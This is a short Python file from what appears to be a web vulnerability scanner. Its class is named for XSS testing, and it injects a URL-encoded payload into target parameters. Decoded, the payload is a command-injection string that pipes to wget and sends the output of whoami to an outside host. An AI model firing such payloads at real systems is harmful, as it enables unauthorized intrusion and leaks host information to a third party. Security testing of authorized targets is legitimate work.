# coding: utf-8
'''
Created on Nov 12, 2019

@author: guimaizi
'''
import config_function,param_process,http_testing
class xss_testing:
    def __init__(self):
        self.config=config_function.config_function()
        self.param_process=param_process.param_process(['XSSS1%20%7C%20wget%20http%3A%2F%2Fwww.guimaizi.com%2Fxssss12321321888888.php%3F%60whoami%60%20%7C%7C%20aaa'])
        self.http_testing=http_testing.http_testing()
    def run(self):
        for target_list in self.param_process.main(self.config.callback_target()):
            #print(target_list)
            for target in target_list:
                #print(target['name_param'])
                if 'XSSS1' in self.http_testing.callback_response(target['data']):
                    print('XSS: %s\n %s'%(target['name_param'],target['data']))
if __name__ == '__main__':
    p1=xss_testing()
    p1.run()